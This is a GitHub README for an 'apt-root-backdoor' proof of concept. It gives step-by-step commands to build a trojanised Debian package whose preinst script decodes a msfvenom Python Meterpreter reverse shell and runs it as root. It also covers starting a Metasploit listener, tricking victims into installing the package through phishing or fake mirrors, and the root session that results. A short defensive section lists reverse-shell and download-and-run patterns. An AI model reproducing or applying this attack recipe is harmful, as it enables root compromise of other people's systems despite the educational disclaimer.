<div align="center">

# 💀 apt-root-backdoor

### Exploiting `apt install` to Gain Root Access via Malicious `.deb` Packages

![Platform](https://img.shields.io/badge/platform-Kali%20Linux%20%7C%20Debian-blue?style=flat-square)
![Language](https://img.shields.io/badge/language-Bash%20%7C%20Python-yellow?style=flat-square)
![License](https://img.shields.io/badge/license-MIT-green?style=flat-square)
![Purpose](https://img.shields.io/badge/purpose-Educational%20%2F%20Research-red?style=flat-square)
![Status](https://img.shields.io/badge/status-Proof%20of%20Concept-orange?style=flat-square)

</div>

---

> ⚠️ **DISCLAIMER**: This repository is intended **strictly for educational and authorized security research purposes only**. Deploying this technique against systems you do not own or have explicit written permission to test is **illegal** and punishable under computer crime laws in most jurisdictions (e.g., CFAA, Computer Misuse Act). The authors assume **no liability** for misuse. See [DISCLAIMER.md](DISCLAIMER.md) for the full legal notice.

---

## 📚 Table of Contents

- [Overview](#-overview)
- [How It Works](#-how-it-works)
- [Attack Flow Diagram](#-attack-flow-diagram)
- [Prerequisites](#-prerequisites)
- [Quick Start](#-quick-start)
- [Detailed Proof of Concept](#-detailed-proof-of-concept)
  - [Step 1 — Extract & Inspect the Package](#step-1--extract--inspect-the-package)
  - [Step 2 — Generate the Reverse Shell Payload](#step-2--generate-the-reverse-shell-payload)
  - [Step 3 — Embed the Payload in preinst](#step-3--embed-the-payload-in-preinst)
  - [Step 4 — Repack the .deb Package](#step-4--repack-the-deb-package)
  - [Step 5 — Set Up the Metasploit Listener](#step-5--set-up-the-metasploit-listener)
  - [Step 6 — Deliver the Payload](#step-6--deliver-the-payload)
- [Detection & Mitigation](#-detection--mitigation)
- [Project Structure](#-project-structure)
- [Contributing](#-contributing)
- [License](#-license)
- [Author & Contact](#-author--contact)

---

## 🔍 Overview

This repository demonstrates a **critical attack vector** present in Debian-based Linux systems: an attacker can craft a malicious `.deb` package that executes an arbitrary payload **before** the package's installation even begins — with **root privileges** — by abusing the `preinst` maintainer script hook.

When a user runs:

```bash
sudo apt install ./malicious.deb
```

`apt` (and `dpkg`) automatically executes the `DEBIAN/preinst` script as `root` before any files are installed. This means:

- The attacker code runs as **root** regardless of the package's contents.
- The payload runs even if the **installation is cancelled or fails**.
- There is **no user confirmation** for the preinst execution itself.

---

## 🔥 How It Works

| Step | Actor | Action |
|------|-------|--------|
| 1 | Attacker | Generates a Meterpreter reverse shell payload with `msfvenom` |
| 2 | Attacker | Encodes the payload as Base64 and embeds it in `DEBIAN/preinst` |
| 3 | Attacker | Repacks the `.deb` and delivers it to the victim (social engineering, typosquatting, etc.) |
| 4 | Victim | Runs `sudo apt install ./malicious.deb` |
| 5 | System | `dpkg` executes `preinst` **as root** before installation begins |
| 6 | Attacker | Receives a **root Meterpreter shell** on their listener |

### Why This Is Dangerous

- 🔴 **Root access** — Full unrestricted control of the target system.
- 🔴 **Silent execution** — No additional prompts or confirmations are shown to the victim.
- 🔴 **Bypasses package verification** — Runs before any signature or content checks complete.
- 🔴 **Persistent on failure** — Even if `dpkg` rejects the package, the payload has already run.

---

## 🗺️ Attack Flow Diagram

```
┌─────────────────────────────────────────────────────────────────┐
│                        ATTACKER MACHINE                         │
│                                                                 │
│  msfvenom generates payload.py  ──►  base64 encode             │
│         │                                  │                    │
│         └──────────────────────────────────▼                    │
│                              embed in DEBIAN/preinst            │
│                                       │                         │
│                              dpkg-deb -b ──► malicious.deb      │
│                                       │                         │
│                         [social engineering / deliver]          │
└───────────────────────────────────────┼─────────────────────────┘
                                        │
                                        ▼
┌─────────────────────────────────────────────────────────────────┐
│                         VICTIM MACHINE                          │
│                                                                 │
│   sudo apt install ./malicious.deb                              │
│         │                                                       │
│         ▼                                                       │
│   dpkg executes DEBIAN/preinst  (AS ROOT)                       │
│         │                                                       │
│         ▼                                                       │
│   payload.py connects back ──────────────────────────────────►  │
│                                                                 │
└───────────────────────────────────────┬─────────────────────────┘
                                        │
                                        ▼
┌─────────────────────────────────────────────────────────────────┐
│                        ATTACKER MACHINE                         │
│                                                                 │
│   msf exploit/multi/handler                                     │
│         │                                                       │
│         ▼                                                       │
│   💀 ROOT Meterpreter session obtained!                         │
└─────────────────────────────────────────────────────────────────┘
```

---

## 🛠️ Prerequisites

| Requirement | Details |
|-------------|---------|
| **OS** | Kali Linux or any Debian-based distro (attacker machine) |
| **Metasploit Framework** | `msfvenom` + `msfconsole` — [Install guide](https://docs.metasploit.com/docs/using-metasploit/getting-started/nightly-installers.html) |
| **dpkg / dpkg-deb** | Pre-installed on all Debian/Ubuntu/Kali systems |
| **Python 3** | Required on the **victim** machine to execute the payload |
| **Network access** | Attacker and victim must be able to reach each other (same network, VPN, or internet with port forwarding) |

---

## ⚡ Quick Start

> For the full step-by-step walkthrough see [docs/USAGE.md](docs/USAGE.md).

```bash
# 1. Clone this repo
git clone https://github.com/abdulrafayishaCkER/apt-root-backdoor.git
cd apt-root-backdoor

# 2. Extract the sample .deb
dpkg-deb -R filesearch_1.0.deb extracted/

# 3. Generate a payload (replace YOUR_IP and YOUR_PORT)
msfvenom -p python/meterpreter_reverse_tcp \
  LHOST=YOUR_IP LPORT=4444 -f raw > /tmp/payload.py

# 4. Base64-encode the payload
base64 /tmp/payload.py > /tmp/payload.b64

# 5. Edit extracted/DEBIAN/preinst — see docs/USAGE.md for full preinst template

# 6. Repack
dpkg-deb -b extracted/ new_malicious.deb

# 7. Start listener (separate terminal)
msfconsole -x "use exploit/multi/handler; \
  set payload python/meterpreter/reverse_tcp; \
  set LHOST YOUR_IP; set LPORT 4444; exploit"
```

---

## 💀 Detailed Proof of Concept

> ℹ️ Full details with screenshots and extended notes are in [docs/USAGE.md](docs/USAGE.md).

---

### Step 1 — Extract & Inspect the Package

Use `dpkg-deb` to unpack the `.deb` so you can examine and modify its maintainer scripts:

```bash
dpkg-deb -R filesearch_1.0.deb extracted_folder/
```

Inspect what's inside before modifying:

```bash
ls -la extracted_folder/DEBIAN/
cat extracted_folder/DEBIAN/preinst
```

You can also list the package contents without extracting:

```bash
dpkg -c filesearch_1.0.deb
```

---

### Step 2 — Generate the Reverse Shell Payload

Use `msfvenom` to generate a Python-based Meterpreter reverse TCP payload:

```bash
msfvenom -p python/meterpreter_reverse_tcp \
  LHOST=<YOUR_IP> \
  LPORT=4444 \
  -f raw > /tmp/payload.py
```

> 🔹 Replace `<YOUR_IP>` with your attacker machine's IP address.  
> 🔹 Replace `4444` with any preferred port (ensure it is not blocked by a firewall).

Encode the payload in Base64 so it can be safely embedded in a shell script:

```bash
base64 /tmp/payload.py > /tmp/payload.b64
cat /tmp/payload.b64
```

Copy the entire Base64 string from the output — you will need it in the next step.

---

### Step 3 — Embed the Payload in `preinst`

Open `extracted_folder/DEBIAN/preinst` in your editor and replace its contents with:

```bash
#!/bin/bash
# preinst — runs as root before package installation
echo "<BASE64_ENCODED_PAYLOAD>" | base64 -d > /tmp/payload.py
python3 /tmp/payload.py &
```

> 🔹 Replace `<BASE64_ENCODED_PAYLOAD>` with the Base64 string you copied in Step 2.

Make the script executable:

```bash
chmod 755 extracted_folder/DEBIAN/preinst
```

See [`scripts/example-preinst.sh`](scripts/example-preinst.sh) for a fully commented reference.

---

### Step 4 — Repack the `.deb` Package

Rebuild the modified package with `dpkg-deb`:

```bash
dpkg-deb -b extracted_folder/ new_malicious.deb
```

Verify the preinst script is correctly embedded in the new package:

```bash
dpkg-deb --info new_malicious.deb
dpkg-deb -e new_malicious.deb /tmp/verify_DEBIAN/
cat /tmp/verify_DEBIAN/preinst
```

---

### Step 5 — Set Up the Metasploit Listener

On your attacker machine, start `msfconsole` and configure the multi/handler:

```bash
msfconsole
```

```
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload python/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST <YOUR_IP>
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > exploit
```

> 🔹 `LHOST` and `LPORT` must match exactly what you set in Step 2.

Alternatively, use the one-liner version:

```bash
msfconsole -x "use exploit/multi/handler; \
  set payload python/meterpreter/reverse_tcp; \
  set LHOST <YOUR_IP>; \
  set LPORT 4444; \
  exploit"
```

See [`scripts/setup-listener.sh`](scripts/setup-listener.sh) for a reference script.

---

### Step 6 — Deliver the Payload

Deliver `new_malicious.deb` to the victim using any social engineering vector (file share, fake package mirror, phishing, etc.) and have them install it:

```bash
# On the VICTIM's machine:
sudo apt install ./new_malicious.deb
```

**What happens on the victim machine:**

```
Reading package lists... Done
Building dependency tree... Done
(Reading database ... X files and directories currently installed.)
Preparing to unpack new_malicious.deb ...
# ← preinst executes HERE as root, payload connects back
```

**Expected result on the attacker machine:**

```
[*] Started reverse TCP handler on <YOUR_IP>:4444
[*] Meterpreter session 1 opened (<YOUR_IP>:4444 -> <VICTIM_IP>:XXXXX)

meterpreter > getuid
Server username: root
meterpreter > sysinfo
Computer  : victim-hostname
OS        : Linux victim-hostname 5.x.x ...
```

> ⚠️ The payload runs even if the victim cancels the installation or if `dpkg` rejects the package.

---

## 🛡️ Detection & Mitigation

### For Defenders

| Action | Command / Method |
|--------|-----------------|
| **Inspect package contents before installing** | `dpkg -c package.deb` |
| **Extract and read maintainer scripts** | `dpkg-deb -e package.deb /tmp/deb_scripts/ && cat /tmp/deb_scripts/preinst` |
| **Verify package signature** | `dpkg-sig --verify package.deb` |
| **Check package source** | Only install from official, signed repositories |
| **Use a sandbox / VM** | Test unknown packages in an isolated environment before production |
| **Monitor process spawning** | Use `auditd`, `sysdig`, or `falco` to alert on unexpected child processes of `dpkg` |

### Red Flags in `preinst` Scripts

```bash
# Suspicious patterns to look for:
base64 -d        # encoded payload being decoded
/tmp/            # writing executable files to /tmp
curl | bash      # downloading and executing
wget -O- | sh    # same pattern, different tool
python3 &        # backgrounded interpreter
nc -e            # netcat reverse shell
bash -i >& /dev/tcp/...  # bash reverse shell
```

### Hardening Recommendations

- **APT pinning**: Only allow packages from trusted, GPG-signed repositories.
- **AppArmor / SELinux**: Restrict what `dpkg` child processes can do.
- **Network egress filtering**: Block unexpected outbound connections from package management processes.
- **Package auditing**: Integrate `debsums` or custom CI checks to scan `.deb` files before deployment.

---

## 📁 Project Structure

```
apt-root-backdoor/
├── README.md                  # This file
├── DISCLAIMER.md              # Full legal disclaimer
├── LICENSE                    # MIT License
├── .gitignore                 # OS/editor artifact exclusions
├── filesearch_1.0.deb         # Sample .deb file for testing
├── docs/
│   └── USAGE.md               # Extended step-by-step usage guide
└── scripts/
    ├── example-preinst.sh     # Commented example malicious preinst script
    └── setup-listener.sh      # Metasploit listener reference script
```

---

## 🤝 Contributing

Contributions that improve clarity, add new detection techniques, or expand the educational content are welcome.

1. Fork the repository
2. Create a feature branch: `git checkout -b feature/your-improvement`
3. Commit your changes: `git commit -m 'Add: description of change'`
4. Push to the branch: `git push origin feature/your-improvement`
5. Open a Pull Request

> Please ensure all contributions remain **strictly educational** in nature.

---

## 📄 License

This project is licensed under the **MIT License** — see the [LICENSE](LICENSE) file for details.

---

## 👤 Author & Contact

**abdulrafayishaCkER**  
GitHub: [@abdulrafayishaCkER](https://github.com/abdulrafayishaCkER)

---

<div align="center">

⭐ **If this helped your research, please star the repo!** ⭐

*For the full legal disclaimer, see [DISCLAIMER.md](DISCLAIMER.md)*

</div>
